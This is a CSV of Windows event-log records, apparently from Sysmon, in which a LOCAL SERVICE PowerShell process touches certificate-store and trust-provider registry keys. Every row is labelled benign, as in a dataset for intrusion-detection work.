timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3560000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
